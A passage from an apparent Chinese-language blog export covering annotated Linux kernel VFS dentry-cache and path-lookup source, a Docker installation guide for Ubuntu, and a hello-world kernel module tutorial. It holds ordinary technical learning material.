initcall_debug_enable(); context_tracking_init(); /* init some links before init_ISA_irqs() */ early_irq_init(); init_IRQ(); tick_init(); rcu_init_nohz(); init_timers(); srcu_init(); hrtimers_init(); softirq_init(); timekeeping_init(); time_init(); /* This must be after timekeeping is initialized */ random_init(); /* These make use of the fully initialized rng */ kfence_init(); boot_init_stack_canary(); perf_event_init(); profile_init(); call_function_init(); WARN(!irqs_disabled(), &quot;Interrupts were enabled early\\n&quot;); early_boot_irqs_disabled = false; local_irq_enable(); kmem_cache_init_late(); /* * HACK ALERT! This is early. We&#x27;re enabling the console before * we&#x27;ve done PCI setups etc, and console_init() must be aware of * this. But we do want output early, in case something goes wrong. */ console_init(); if (panic_later) panic(&quot;Too many boot %s vars at `%s&#x27;&quot;, panic_later, panic_param); lockdep_init(); /* * Need to run this when irqs are enabled, because it wants * to self-test [hard/soft]-irqs on/off lock inversion bugs * too: */ locking_selftest(); /* * This needs to be called before any devices perform DMA * operations that might use the SWIOTLB bounce buffers. It will * mark the bounce buffers as decrypted so that their usage will * not cause &quot;plain-text&quot; data to be decrypted when accessed. */ mem_encrypt_init();#ifdef CONFIG_BLK_DEV_INITRD if (initrd_start &amp;&amp; !initrd_below_start_ok &amp;&amp; page_to_pfn(virt_to_page((void *)initrd_start)) &lt; min_low_pfn) &#123; pr_crit(&quot;initrd overwritten (0x%08lx &lt; 0x%08lx) - disabling it.\\n&quot;, page_to_pfn(virt_to_page((void *)initrd_start)), min_low_pfn); initrd_start = 0; &#125;#endif setup_per_cpu_pageset(); numa_policy_init(); acpi_early_init(); if (late_time_init) late_time_init(); sched_clock_init(); calibrate_delay(); pid_idr_init(); anon_vma_init();#ifdef CONFIG_X86 if (efi_enabled(EFI_RUNTIME_SERVICES)) efi_enter_virtual_mode();#endif thread_stack_cache_init(); cred_init(); fork_init(); proc_caches_init(); uts_ns_init(); key_init(); security_init(); dbg_late_init(); net_ns_init(); vfs_caches_init(); pagecache_init(); signals_init(); seq_file_init(); proc_root_init(); nsfs_init(); cpuset_init(); cgroup_init(); taskstats_init_early(); delayacct_init(); check_bugs(); acpi_subsystem_init(); arch_post_acpi_subsys_init(); kcsan_init(); /* Do the rest non-__init&#x27;ed, we&#x27;re now alive */ arch_call_rest_init(); prevent_tail_call_optimization();&#125; 通过dcache_init初始化哈希表存放dcache，将dentry通过哈希表组织起来 dcache.c - fs&#x2F;dcache.c - Linux source code (v6.3.8) - Bootlin 123456789101112131415161718192021222324252627282930313233static void __init dcache_init(void)&#123; /* * 对于稳定状态的列表，可以添加一个构造函数， * 但由于dcache的缓存特性，这可能并不值得。 */ // 创建一个dentry_cache，它是一个内存缓存，用于存储dentry结构 dentry_cache = KMEM_CACHE_USERCOPY(dentry, // 设置内存缓存的一些属性标志 SLAB_RECLAIM_ACCOUNT|SLAB_PANIC|SLAB_MEM_SPREAD|SLAB_ACCOUNT, d_iname); // 如果hashdist没有设置，直接返回 /* Hash may have been set up in dcache_init_early */ if (!hashdist) return; // 分配一个大型系统哈希表，用于存储dentry结构的哈希表 dentry_hashtable = alloc_large_system_hash(&quot;Dentry cache&quot;, // 每个哈希表节点的大小 sizeof(struct hlist_bl_head), // 哈希表的预分配大小 dhash_entries, 13, // 这是一个固定参数，用于计算哈希表的大小 HASH_ZERO, // 哈希表的标志 &amp;d_hash_shift, // 用于计算哈希值的移位值 NULL, // 指定一个用于计算哈希值的函数，这里使用默认函数 0, // 只在NUMA系统中使用，这里设置为0 0); // 只在NUMA系统中使用，这里设置为0 // 计算哈希值的移位值 d_hash_shift = 32 - d_hash_shift;&#125; dcache_init函数主要工作内容是两项。 第一项是初始化dentry cache模块的私有变量struct kmem_cache *dentry_cache，这是一个slab内存分配器。slab内存分配是内核内存管理的常用手段，其核心思想非常简单，可以理解为一个对象池，专门应对同一类型，也就是等长内存的频繁分配和释放。dentry cache模块的dentry_cache字段就是专门用来分配struct dentry数据结构所需使用的内存的。 第二项是初始化dentry cache模块的另一个私有变量struct hlist_bl_head *dentry_hashtable，这是一个巨大的哈希表，也就是dentry cache的查找索引，可以dentry的name直接在这个哈希表中进行查找。类型struct hlist_bl_head是一个bit lock hash list的链表头。hash list用于实现哈希表的一个slot，这里的bit lock hash list是一个内核中的hash list实现版本，不需要为每个hash list分配一把锁，只需要使用链表头指针的一个bit来进行访问并发控制，节省内存开销。dentry_hashtable由一个定长的hlist_bl_head数组组成，相当于是一个永不扩容的哈希表，可以减少并发控制带来的性能开销和实现复杂度。 在dentry的数据结构中，是通过类型为qstr的name来充当key值，进而计算出hash表的索引即value，例如下面的代码 d_hash identifier - Linux source code (v6.3.8) - Bootlin 12345d_hash(dentry-&gt;d_name.hash)static inline struct hlist_bl_head *d_hash(unsigned int hash)&#123; return dentry_hashtable + (hash &gt;&gt; d_hash_shift);&#125; 既然是依据name来做hash，那相同name的、不同name的，都可能在同一hash链表里（碰撞）。 name不同，可以通过对比字符串，而name相同的，其parent肯定不同（同一目录下不可能有两种同名的文件），所以具有是具有唯一性的。 dentry identifier - Linux source code (v6.3.8) - Bootlin 1234567891011121314151617181920212223242526272829303132struct dentry &#123; /* RCU lookup touched fields */ unsigned int d_flags; /* 目录项的标志位，受 d_lock 保护 */ seqcount_spinlock_t d_seq; /* 每个目录项的序列锁 */ struct hlist_bl_node d_hash; /* 目录项形成的用于查找的哈希列表 */ struct dentry *d_parent; /* 父目录的目录项dentry */ struct qstr d_name; /* 目录项的名称（可以快速查找） */ struct inode *d_inode; /* 与文件名称关联的，与目录名关联的 inode 结构指针，NULL 表示负目录项 */ unsigned char d_iname[DNAME_INLINE_LEN]; /* 短文件名称 */ /* Ref lookup also touches following */ struct lockref d_lockref; /* 每个目录项的锁和引用计数 */ const struct dentry_operations *d_op; /* 目录项操作函数集 */ struct super_block *d_sb; /* 目录项树的根节点（即文件的超级块） */ unsigned long d_time; /* 用于 d_revalidate 的时间戳 */ void *d_fsdata; /* 特定文件系统的数据 */ union &#123; struct list_head d_lru; /* LRU（最近最少使用）列表 */ wait_queue_head_t *d_wait; /* 仅用于查找中的目录项 */ &#125;; struct list_head d_child; /* 父目录项的子项列表 */ struct list_head d_subdirs; /* 子目录项列表 */ /* * d_alias and d_rcu can share memory */ union &#123; struct hlist_node d_alias; struct hlist_bl_node d_in_lookup_hash; /* 仅用于查找中的目录项 */ struct rcu_head d_rcu; &#125; d_u;&#125; __randomize_layout; 只要在内存中建立了一个dentry，那么它指向的inode也会在内存中被”cached”，这就构成了inode cache（简称icache），icache的每一项内容都是一个已挂载的文件系统中的文件inode。 如果一个dentry的引用计数（dentry-&gt;d_lockref.count)不为0，说明还有进程在引用它，比如通过“open”操作，此时dentry处于“in use”状态。 而当其引用计数变为0，表明不再被使用（比如文件被close了），则切换到“unused”的状态，但此时其指向的内存inode依然有效，因为这些inode对应的文件之后可能被用到。删除指向相应文件的最后一个硬链接时，in use的dentry可能会变为negative，在这种情况下，dentry对象会移动到unused dentry的LRU列表中。 对于那些unused状态的dentry对象来说，它们被再次访问的可能性很大，因此，不能将它们立即丢弃而必须将它们在dcache保留一段时间。为此，Linux通过LRU链表来有效地管理这些未使用的dentry对象。每一个处于unused状态下的dentry通过其d_lru指针域链入系统全局的LRU链表，表头包含在super_block::s_dentry_lru中。 当内存紧张时，这些unused dentry所占据的内存是可以被回收的，根据局部性原理，我们应当选择最近未被使用的dentry作为回收的对象。同page cache类似，通过slab cache分配得到的dentry在进入unused状态后，会通过LRU链表的形式被管理，最新加入的unused dentry被放在链表的头部，启动内存shrink的操作时，链表尾部的dentry将被率先回收。 d_lru_add identifier - Linux source code (v6.3.8) - Bootlin 123456789static void d_lru_add(struct dentry *dentry)&#123; D_FLAG_VERIFY(dentry, 0); dentry-&gt;d_flags |= DCACHE_LRU_LIST; this_cpu_inc(nr_dentry_unused); if (d_is_negative(dentry)) this_cpu_inc(nr_dentry_negative); WARN_ON_ONCE(!list_lru_add(&amp;dentry-&gt;d_sb-&gt;s_dentry_lru, &amp;dentry-&gt;d_lru));&#125; 如果尝试open一个路径，但最后发现此路径对应的文件在磁盘上是不存在的，此时路径对应的的dentry也会以negative entry的形式记录在dcache里，这样下次在试图访问这个不存在的路径时，可以立即返回错误，不用再去磁盘瞎折腾一番（失败的案例同样有价值）。 path lookup搜索dcache流程路径查找首先用lookup_fast在dcache里找，一开始查找的时候会设置LOOKUP_RCU标志，所以会调用__d_lookup_rcu函数，这个函数里通过d_hash找到要找的dentry的对应的哈希表，通过hlist_bl_for_each_entry_rcu遍历这个哈希表，对比父目录，名称等等是否相同，然后在这个函数里没有锁之类的东西，如果找不到，会通过try_to_unlazy函数将rcu-walk转为ref-walk，然后一层层返回上去，到do_filp_open函数中，重新调用path_openat函数，这个时候没有设置LOOKUP_RCU了，所以先进入lookup_fast就不会调用__d_lookup_rcu，而是去调用__d_lookup，这个函数和__d_lookup_rcu基本相同，但是多了很多锁，如果这个函数还是找不到对应的dentry，就说明在dcache中没有，就要进入lookup_slow调用具体文件系统的lookup，去磁盘里找。 首先看到do_filp_open函数 123456789101112131415161718192021222324// 定义一个名为 do_filp_open 的函数，该函数接受三个参数：dfd（目录文件描述符），pathname（文件名结构体指针）和 op（打开方式结构体指针）struct file *do_filp_open(int dfd, struct filename *pathname, const struct open_flags *op)&#123; struct nameidata nd; // 从 op 结构体中获取查找标志 int flags = op-&gt;lookup_flags; struct file *filp; // 使用 set_nameidata 函数初始化 nd 结构体，传入 dfd（目录文件描述符）、pathname（文件名结构体指针）和 NULL（用于初始化 nd-&gt;intent） set_nameidata(&amp;nd, dfd, pathname, NULL); // 使用 path_openat 函数尝试打开文件，传入 nd（名字数据结构体）、op（打开方式结构体）和 flags（查找标志）；使用 LOOKUP_RCU 标志进行 RCU 优化 filp = path_openat(&amp;nd, op, flags | LOOKUP_RCU); // 如果文件打开失败并返回 -ECHILD 错误码，表明 RCU 优化失败，尝试使用非 RCU 优化方式打开文件 if (unlikely(filp == ERR_PTR(-ECHILD))) filp = path_openat(&amp;nd, op, flags); // 如果文件打开失败并返回 -ESTALE 错误码，表明文件系统状态陈旧，尝试使用 LOOKUP_REVAL 标志重新评估文件系统状态并打开文件 if (unlikely(filp == ERR_PTR(-ESTALE))) filp = path_openat(&amp;nd, op, flags | LOOKUP_REVAL); // 通过调用 restore_nameidata 函数恢复名字数据结构体（nd）的状态 restore_nameidata(); // 返回文件结构体指针 filp return filp;&#125; 在这里展示了path walk的两种策略：rcu-walk和ref-walk。在 rcu-walk 期间将会禁止抢占，也决不能出现进程阻塞，所以其效率很高；ref-walk 会在 rcu-walk 失败、进程需要随眠或者需要取得某结构的引用计数（reference count）的情况下切换进来，很明显它的效率大大低于 rcu-walk。最后 REVAL其实也是 ref-walk，在以后我们会看到，该模式是在已经完成了路径查找，打开具体文件时，如果该文件已经过期（stale）才启动的，所以 REVAL 是给具体文件系统自己去解释的。其实 REVAL 几乎不会用到，在内核的文件系统中只有 nfs 用到了这个模式。 首先看到filp = path_openat(&amp;nd, op, flags | LOOKUP_RCU);就是使用rcu-walk先进行路径查找，如果查找失败，回退到do_filp_open，进行ref-walk。 进入到path_openat函数中 123456789// 定义一个名为 path_openat 的静态函数，该函数接受三个参数：nd（名字数据结构体指针）、op（打开方式结构体指针）和 flags（打开标志）static struct file *path_openat(struct nameidata *nd, const struct open_flags *op, unsigned flags)&#123; ... while (!(error = link_path_walk(s, nd)) &amp;&amp; (s = open_last_lookups(nd, file, op)) != NULL) ...&#125; link_path_walk在达到最终目标所在目录的时候停下来，最终目标交给另一个函数open_last_lookups。 在link_path_walk中有一个大循环，循环处理每个组件，其中，通过walk_component函数处理中间组件，接下来看到walk_component函数。 12345678910111213141516171819202122232425262728293031323334353637// 定义一个名为 walk_component 的函数，参数包括一个指向 nameidata 结构体的指针和一个整数 flagsstatic const char *walk_component(struct nameidata *nd, int flags)&#123; // 定义一个指向 dentry 结构体的指针 struct dentry *dentry; /* * &quot;.&quot; 和 &quot;..&quot; 是特殊的 - 尤其是 &quot;..&quot;，因为它必须知道当前根目录和 * 父目录之间的关系。 */ // 如果 nd-&gt;last_type 不是 LAST_NORM，则执行以下代码 if (unlikely(nd-&gt;last_type != LAST_NORM)) &#123; // 如果 flags 没有设置 WALK_MORE 且 nd-&gt;depth 不为 0，则调用 put_link 函数 if (!(flags &amp; WALK_MORE) &amp;&amp; nd-&gt;depth) put_link(nd); // 调用 handle_dots 函数处理 &quot;.&quot; 和 &quot;..&quot; return handle_dots(nd, nd-&gt;last_type); &#125; // 调用 lookup_fast 函数进行快速查找 dentry = lookup_fast(nd); // 如果 dentry 是一个错误指针，则返回错误指针 if (IS_ERR(dentry)) return ERR_CAST(dentry); // 如果 dentry 为 NULL，则执行以下代码 if (unlikely(!dentry)) &#123; // 调用 lookup_slow 函数进行慢速查找 dentry = lookup_slow(&amp;nd-&gt;last, nd-&gt;path.dentry, nd-&gt;flags); // 如果 dentry 是一个错误指针，则返回错误指针 if (IS_ERR(dentry)) return ERR_CAST(dentry); &#125; // 如果 flags 没有设置 WALK_MORE 且 nd-&gt;depth 不为 0，则调用 put_link 函数 if (!(flags &amp; WALK_MORE) &amp;&amp; nd-&gt;depth) put_link(nd); // 调用 step_into 函数进入下一个组件（目录或文件） return step_into(nd, flags, dentry);&#125; 对于这个子路径可以分成三种情况，第一，它可能是“.”或“..”；第二，这就是一个普通的目录；第三，它是一个符号链接。 对于普通组件，可以看到，首先会尝试lookup_fast然后，如果失败了才会启动lookup_slow。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647static struct dentry *lookup_fast(struct nameidata *nd)&#123; struct dentry *dentry, *parent = nd-&gt;path.dentry; // 定义dentry指针，将nd中的path的dentry赋值给parent int status = 1; /* * Rename seqlock is not required here because in the off chance * of a false negative due to a concurrent rename, the caller is * going to fall back to non-racy lookup. */ if (nd-&gt;flags &amp; LOOKUP_RCU) &#123; // 如果使用RCU（读-拷贝-更新）查找 dentry = __d_lookup_rcu(parent, &amp;nd-&gt;last, &amp;nd-&gt;next_seq); // 用RCU方式查找目录项 if (unlikely(!dentry)) &#123; // 如果没有找到dentry if (!try_to_unlazy(nd)) // 尝试将rcu锁升级为非rcu锁 return ERR_PTR(-ECHILD); // 返回错误 return NULL; // 返回空指针 &#125; /* * This sequence count validates that the parent had no * changes while we did the lookup of the dentry above. */ if (read_seqcount_retry(&amp;parent-&gt;d_seq, nd-&gt;seq)) // 验证在查找dentry过程中parent没有发生变化 return ERR_PTR(-ECHILD); // 返回错误 status = d_revalidate(dentry, nd-&gt;flags); // 验证dentry的有效性 if (likely(status &gt; 0)) // 如果验证成功 return dentry; // 返回dentry if (!try_to_unlazy_next(nd, dentry)) // 尝试将rcu锁升级为非rcu锁 return ERR_PTR(-ECHILD); // 返回错误 if (status == -ECHILD) /* we&#x27;d been told to redo it in non-rcu mode */ status = d_revalidate(dentry, nd-&gt;flags); // 在非RCU模式下重新验证dentry的有效性 &#125; else &#123; // 如果使用非RCU查找，REF查找 dentry = __d_lookup(parent, &amp;nd-&gt;last); // 查找目录项 if (unlikely(!dentry)) // 如果没有找到dentry return NULL; // 返回空指针 status = d_revalidate(dentry, nd-&gt;flags); // 验证dentry的有效性 &#125; if (unlikely(status &lt;= 0)) &#123; // 如果验证失败 if (!status) // 如果status为0 d_invalidate(dentry); // 使dentry无效 dput(dentry); // 释放dentry引用 return ERR_PTR(status); // 返回错误 &#125; return dentry; // 返回dentry&#125; 首先尝试进入lookup_fast中，尝试rcu-walk，即进入__d_lookup_rcu函数中，进入__d_lookup_rcu函数中 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869struct dentry *__d_lookup_rcu(const struct dentry *parent, const struct qstr *name, unsigned *seqp)&#123; u64 hashlen = name-&gt;hash_len; // 计算名称的哈希长度 const unsigned char *str = name-&gt;name; // 获取名称字符串 struct hlist_bl_head *b = d_hash(hashlen_hash(hashlen)); // 计算哈希值并获取散列表头 struct hlist_bl_node *node; // 定义哈希表节点指针 struct dentry *dentry; // 定义目录项指针 /* * Note: There is significant duplication with __d_lookup_rcu which is * required to prevent single threaded performance regressions * especially on architectures where smp_rmb (in seqcounts) are costly. * Keep the two functions in sync. */ // 检查父目录项是否包含自定义比较函数，如果有则调用特定的查找函数 if (unlikely(parent-&gt;d_flags &amp; DCACHE_OP_COMPARE)) return __d_lookup_rcu_op_compare(parent, name, seqp); /* * The hash list is protected using RCU. * * Carefully use d_seq when comparing a candidate dentry, to avoid * races with d_move(). * * It is possible that concurrent renames can mess up our list * walk here and result in missing our dentry, resulting in the * false-negative result. d_lookup() protects against concurrent * renames using rename_lock seqlock. * * See Documentation/filesystems/path-lookup.txt for more details. */ // 使用 RCU 保护的哈希列表来遍历目录项 hlist_bl_for_each_entry_rcu(dentry, node, b, d_hash) &#123; unsigned seq; /* * The dentry sequence count protects us from concurrent * renames, and thus protects parent and name fields. * * The caller must perform a seqcount check in order * to do anything useful with the returned dentry. * * NOTE! We do a &quot;raw&quot; seqcount_begin here. That means that * we don&#x27;t wait for the sequence count to stabilize if it * is in the middle of a sequence change. If we do the slow * dentry compare, we will do seqretries until it is stable, * and if we end up with a successful lookup, we actually * want to exit RCU lookup anyway. * * Note that raw_seqcount_begin still *does* smp_rmb(), so * we are still guaranteed NUL-termination of -&gt;d_name.name. */ seq = raw_seqcount_begin(&amp;dentry-&gt;d_seq); // 获取 dentry 的序列计数 if (dentry-&gt;d_parent != parent) // 检查 dentry 的父目录项是否与给定的父目录项相同 continue; if (d_unhashed(dentry)) // 检查 dentry 是否已从散列表中删除 continue; if (dentry-&gt;d_name.hash_len != hashlen) // 检查 dentry 的名称哈希长度是否与给定名称相同 continue; if (dentry_cmp(dentry, str, hashlen_len(hashlen)) != 0) // 比较 dentry 的名称与给定名称是否相同 continue; *seqp = seq; // 将序列计数赋值给 seqp return dentry; // 返回找到的 dentry &#125; return NULL; // 如果没有找到匹配的 dentry，则返回空指针&#125; 首先通过d_hash得到对应的哈希表，然后通过hlist_bl_for_each_entry_rcu遍历哈希表，在rcu模式下，依次比较dentry的父目录，哈希长度，名称是否相等。 如果没有找到dentry，返回到上层的lookup_fast函数，会通过try_to_unlazy切换到ref-walk，然后返回ERR_PTR(-ECHILD)。 最终会返回到do_filp_open函数中，重新进行路径查找 123456789101112131415161718192021222324// 定义一个名为 do_filp_open 的函数，该函数接受三个参数：dfd（目录文件描述符），pathname（文件名结构体指针）和 op（打开方式结构体指针）struct file *do_filp_open(int dfd, struct filename *pathname, const struct open_flags *op)&#123; struct nameidata nd; // 从 op 结构体中获取查找标志 int flags = op-&gt;lookup_flags; struct file *filp; // 使用 set_nameidata 函数初始化 nd 结构体，传入 dfd（目录文件描述符）、pathname（文件名结构体指针）和 NULL（用于初始化 nd-&gt;intent） set_nameidata(&amp;nd, dfd, pathname, NULL); // 使用 path_openat 函数尝试打开文件，传入 nd（名字数据结构体）、op（打开方式结构体）和 flags（查找标志）；使用 LOOKUP_RCU 标志进行 RCU 优化 filp = path_openat(&amp;nd, op, flags | LOOKUP_RCU); // 如果文件打开失败并返回 -ECHILD 错误码，表明 RCU 优化失败，尝试使用非 RCU 优化方式打开文件 if (unlikely(filp == ERR_PTR(-ECHILD))) filp = path_openat(&amp;nd, op, flags); // 如果文件打开失败并返回 -ESTALE 错误码，表明文件系统状态陈旧，尝试使用 LOOKUP_REVAL 标志重新评估文件系统状态并打开文件 if (unlikely(filp == ERR_PTR(-ESTALE))) filp = path_openat(&amp;nd, op, flags | LOOKUP_REVAL); // 通过调用 restore_nameidata 函数恢复名字数据结构体（nd）的状态 restore_nameidata(); // 返回文件结构体指针 filp return filp;&#125; 这次查找，运行到lookup_fast时，不会运行__d_lookup_rcu,而是运行__d_lookup，进入这个函数中 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667/** * __d_lookup - 搜索一个 dentry (容易出现竞争) * @parent: 父 dentry * @name: 我们希望找到的名字的 qstr * 返回: dentry，或者 NULL * * __d_lookup 类似于 d_lookup，但是由于与重命名无关的活动，它可能（很少）返回 * 一个错误的负面结果。 * * __d_lookup 通过避免读取 rename_lock seqlock，速度稍快， * 但必须谨慎使用，例如在失败时使用后续的 d_lookup。 * * __d_lookup 调用者必须加注释。 */struct dentry *__d_lookup(const struct dentry *parent, const struct qstr *name)&#123; unsigned int hash = name-&gt;hash; // 计算 name 的哈希值 struct hlist_bl_head *b = d_hash(hash); // 获取哈希值对应的哈希表头 struct hlist_bl_node *node; // 用于遍历哈希链表的节点 struct dentry *found = NULL; // 用于存储找到的 dentry struct dentry *dentry; // 用于遍历哈希链表的临时 dentry /* * 注意：这里与 __d_lookup_rcu 有很大的重复部分，这是为了防止单线程性能 * 回归，特别是在 smp_rmb（在 seqcounts 中）代价高昂的架构上。 * 保持这两个函数同步更新。 */ /* * 哈希列表使用 RCU 保护。 * * 在比较候选 dentry 时，获取 d_lock 以避免与 d_move() 的竞争。 * * 有可能并发的重命名操作会破坏我们这里的列表遍历，导致我们错过 dentry， * 从而产生错误的负面结果。d_lookup() 使用 rename_lock seqlock 来保护 * 并发重命名。 * * 更多细节请参阅 Documentation/filesystems/path-lookup.txt。 */ rcu_read_lock(); // 获取 RCU 读锁 // 遍历哈希链表 hlist_bl_for_each_entry_rcu(dentry, node, b, d_hash) &#123; if (dentry-&gt;d_name.hash != hash) // 哈希值不匹配，继续下一个 continue; spin_lock(&amp;dentry-&gt;d_lock); // 获取 dentry 的自旋锁 if (dentry-&gt;d_parent != parent) // 父 dentry 不匹配，跳到下一个 goto next; if (d_unhashed(dentry)) // 检查 dentry 是否已从哈希表中移除，如果是则跳到下一个 goto next; if (!d_same_name(dentry, parent, name)) // 名字不匹配，跳到下一个 goto next; dentry-&gt;d_lockref.count++; // 增加 dentry 的引用计数 found = dentry; // 找到匹配的 dentry，赋值给 found spin_unlock(&amp;dentry-&gt;d_lock); // 释放 dentry 的自旋锁 break; // 结束循环 next: spin_unlock(&amp;dentry-&gt;d_lock); // 释放 dentry 的自旋锁 &#125; rcu_read_unlock(); // 释放 RCU 读锁 return found; // 返回找到的 dentry，如果没有找到返回 NULL&#125; 可以看到这个函数和上面的rcu-walk基本相同，但是多了很多锁的处理，所以rcu-walk的速度比ref的速度快。 如果ref-walk还没找到对应的dentry，就会进入到lookup_slow调用对应的具体文件系统的lookup方法 参考资料 Linux系统调用open函数分析___randomize_layout_shp1234的博客-CSDN博客 Linux path-lookup 翻译 - 掘金 (juejin.cn) vfs dentry cache 模块实现分析 - 知乎 (zhihu.com)s Linux的VFS实现 - 番外[一] - dcache - 知乎 (zhihu.com)","categories":[{"name":"Linux内核","slug":"Linux内核","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/"},{"name":"VFS","slug":"Linux内核/VFS","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/VFS/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"VFS","slug":"VFS","permalink":"http://example.com/tags/VFS/"}]},{"title":"学习 Linux Docker环境搭建","slug":"学习-Linux-Docker环境搭建","date":"2023-07-16T12:59:54.000Z","updated":"2023-07-18T08:12:47.624Z","comments":true,"path":"2023/07/16/学习-Linux-Docker环境搭建/","link":"","permalink":"http://example.com/2023/07/16/%E5%AD%A6%E4%B9%A0-Linux-Docker%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","excerpt":"在 Ubuntu 20.04 上安装 Docker 使用Docker repository 来安装 12345678910111213141516171819202122232425262728# 更新apt包索引sudo apt-get update# 为支持httpssudo apt-get install \\ apt-transport-https \\ ca-certificates \\ curl \\ gnupg-agent \\ software-properties-common# 添加Docker GPG秘钥# 国内源curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | sudo apt-key add -# 或者国外源# curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -# 添加安装源# 推荐国内源sudo add-apt-repository \\ &quot;deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu \\ $(lsb_release -cs) \\ stable&quot;# 或者国外源# sudo add-apt-repository \\# &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \\# $(lsb_release -cs) \\# stable&quot;","text":"在 Ubuntu 20.04 上安装 Docker 使用Docker repository 来安装 12345678910111213141516171819202122232425262728# 更新apt包索引sudo apt-get update# 为支持httpssudo apt-get install \\ apt-transport-https \\ ca-certificates \\ curl \\ gnupg-agent \\ software-properties-common# 添加Docker GPG秘钥# 国内源curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | sudo apt-key add -# 或者国外源# curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -# 添加安装源# 推荐国内源sudo add-apt-repository \\ &quot;deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu \\ $(lsb_release -cs) \\ stable&quot;# 或者国外源# sudo add-apt-repository \\# &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \\# $(lsb_release -cs) \\# stable&quot; 安装Docker 12345# 更新apt包索引sudo apt-get update# 安装dockersudo apt-get install docker-ce docker-ce-cli containerd.io 开启Docker 12sudo systemctl enable dockersudo systemctl start docker 验证是否安装成功 1sudo docker run hello-world 如果出现”Hello from Docker.”, 则代表运行成功 如果在每次运行docker命令是, 在前面不添加sudo, 可以执行如下命令: 1sudo usermod -aG docker $USER 相关命令 启动 Docker Docker 服务在安装完成后可能并未自动启动，您可以使用以下命令启动 Docker 服务： 1sudo systemctl start docker 设置 Docker 开机自启 如果你希望 Docker 在系统启动时自动运行，可以使用以下命令将其设置为开机自启： 1sudo systemctl enable docker 创建 Docker 用户组 默认情况下，Docker 的守护进程会使用 Unix socket 运行，而只有 root 用户和 docker 组的用户才能访问此 socket。如果您的系统上还没有 docker 用户组，可以使用以下命令创建： 1sudo groupadd docker 将当前用户添加到 Docker 用户组 为了避免每次运行 Docker 命令都需要使用 sudo，您可以将当前用户添加到 docker 用户组： 1sudo usermod -aG docker $USER 应用新的用户组设置 为了让新的用户组设置生效，您需要注销并重新登录，或者可以使用以下命令切换到新的用户组： 1newgrp docker 测试 Docker 安装 为了确认 Docker 已经正确安装并可以被当前用户无需 sudo 就能正确使用，可以运行一个测试容器，例如： 1docker run hello-world","categories":[{"name":"Linux内核","slug":"Linux内核","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/"}],"tags":[]},{"title":"学习 Linux 自定义内核模块","slug":"学习-Linux-自定义内核模块","date":"2023-07-15T08:44:44.000Z","updated":"2023-07-18T08:12:34.398Z","comments":true,"path":"2023/07/15/学习-Linux-自定义内核模块/","link":"","permalink":"http://example.com/2023/07/15/%E5%AD%A6%E4%B9%A0-Linux-%E8%87%AA%E5%AE%9A%E4%B9%89%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97/","excerpt":"程序举例可以在任意目录下编写自定义内核模块，在这个例子中我将模块放在&#x2F;home&#x2F;hust&#x2F;modules_6.3.7，例如编写一段hello.c代码 12345678910111213141516171819202122 // hello.c #include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;static int __init hello_init(void)&#123; printk(&quot;Hello World!\\n&quot;); return 0;&#125;static void __exit hello_exit(void)&#123; printk(&quot;Goodbye World!\\n&quot;);&#125;module_init(hello_init);module_exit(hello_exit);MODULE_LICENSE(&quot;GPL&quot;);MODULE_AUTHOR(&quot;Your Name&quot;);MODULE_DESCRIPTION(&quot;A Simple Hello World module&quot;);","text":"程序举例可以在任意目录下编写自定义内核模块，在这个例子中我将模块放在&#x2F;home&#x2F;hust&#x2F;modules_6.3.7，例如编写一段hello.c代码 12345678910111213141516171819202122 // hello.c #include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;static int __init hello_init(void)&#123; printk(&quot;Hello World!\\n&quot;); return 0;&#125;static void __exit hello_exit(void)&#123; printk(&quot;Goodbye World!\\n&quot;);&#125;module_init(hello_init);module_exit(hello_exit);MODULE_LICENSE(&quot;GPL&quot;);MODULE_AUTHOR(&quot;Your Name&quot;);MODULE_DESCRIPTION(&quot;A Simple Hello World module&quot;); 说明：虽然文件后缀为.c，但是语法跟标准c有差异，模块编写是基于内核编写的 编写Makefile在hello.c相同目录下新建Makefile文件，内容如下 12345678910obj-m := hello.o KDIR := /home/hust/linux-6.3.7MDIR := /home/hust/modules_6.3.7all: make -C $(KDIR) M=$(MDIR) modulesclean: make -C $(KDIR) M=$(MDIR) clean KDIR是linux内核的源码文件夹，这里linux-6.3.7是自己编译运行的内核，所以直接就放的是内核源码文件夹，如果是Ubuntu的内核，就在 &#x2F;usr&#x2F;src文件夹里找到相应的内核。 MDIR是hello.c所在的文件夹，即自定义内核模块所在的文件夹。 编译模块文件执行命令 1make 得到hello.ko文件，即为模块文件 安装模块执行命令 1sudo insmod hello.ko 验证是否成功执行命令 1sudo dmesg 查看输出了我们代码中打印的Hello World! 执行命令 1lsmod | grep hello 可以看到模块已经出现了 卸载模块执行 1sudo rmmod hello 验证是否成功执行命令 1sudo dmesg 查看输出了我们代码中打印的Goodbye World！ 执行 1lsmod | grep hello 可以看到我们的模块已经不存在了","categories":[{"name":"Linux内核","slug":"Linux内核","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/"}],"tags":[]},{"title":"C++学习 网络编程 libevent","slug":"C++-学习-网络编程-libevent","date":"2023-07-04T01:58:46.000Z","updated":"2023-07-26T10:02:32.873Z","comments":true,"path":"2023/07/04/C++-学习-网络编程-libevent/","link":"","permalink":"http://example.com/2023/07/04/C++-%E5%AD%A6%E4%B9%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B-libevent/","excerpt":"学习目标 描述什么是libevent并掌握如何安装 